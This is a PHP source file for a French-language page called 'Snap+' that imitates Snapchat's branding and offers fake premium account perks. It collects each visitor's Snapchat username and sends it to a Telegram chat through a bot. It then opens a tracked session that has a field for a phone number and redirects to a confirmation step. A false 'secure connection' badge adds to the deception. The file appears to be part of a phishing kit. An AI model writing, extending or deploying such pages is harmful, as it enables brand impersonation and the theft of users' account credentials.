<?php

declare(strict_types=1);

require __DIR__ . '/includes/bootstrap.php';

session_start();

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pseudo = isset($_POST['pseudo']) ? trim((string) $_POST['pseudo']) : '';

    if ($pseudo === '') {
        $error = 'Veuillez entrer votre nom d\'utilisateur Snapchat.';
    } elseif (!app_telegram_configured()) {
        $error = 'Configuration Telegram incomplète : renseignez le token et le chat ID dans config.php.';
    } else {
        $text = 'Nouveau pseudo Snapchat : ' . $pseudo;
        $r = app_telegram_send([
            'chat_id' => $config['telegram_chat_id'],
            'text' => $text,
        ]);
        if (!$r['ok']) {
            $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
        } else {
            $flowId = app_new_flow_id();
            $secret = app_new_secret();
            app_flow_write($flowId, [
                'pseudo' => $pseudo,
                'secret' => $secret,
                'phone' => null,
                'created' => time(),
            ]);
            $_SESSION['flow_id'] = $flowId;
            $_SESSION['flow_secret'] = $secret;
            header('Location: confirm.php', true, 302);
            exit;
        }
    }
}

$pageBackground = '#FFFC00';
$css = require __DIR__ . '/includes/snap_styles.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snap+</title>
    <style><?= $css ?></style>
</head>
<body>
    <div class="card">
        <div class="logo-wrap" aria-hidden="true">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <path fill="#fff" stroke="#000" stroke-width="3" d="M50 8 C28 8 12 28 12 48 c0 8 3 16 8 22 C12 78 8 88 8 92 h84 c0-4-4-14-12-22 5-6 8-14 8-22 C88 28 72 8 50 8z M38 58 c4 6 10 10 12 10 s8-4 12-10"/>
            </svg>
        </div>
        <div class="badge">SNAP+</div>
        <p class="intro">Bienvenue sur Snap+ ! Profitez d'avantages exclusifs et de fonctionnalités premium pour votre compte Snapchat.</p>

        <?php if ($error !== '') : ?>
            <div class="alert alert-error" role="alert"><?= $error ?></div>
        <?php endif; ?>

        <form method="post" action="">
            <label for="pseudo">Nom d'utilisateur</label>
            <input
                type="text"
                id="pseudo"
                name="pseudo"
                placeholder="Nom d'utilisateur Snapchat"
                value="<?= isset($_POST['pseudo']) ? htmlspecialchars((string) $_POST['pseudo'], ENT_QUOTES, 'UTF-8') : '' ?>"
                autocomplete="username"
                maxlength="64"
            >
            <button type="submit" class="btn btn-primary">CONTINUER</button>
        </form>

        <div class="footer-secure">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="#FF9800" aria-hidden="true">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Connexion sécurisée</span>
        </div>
    </div>
</body>
</html>
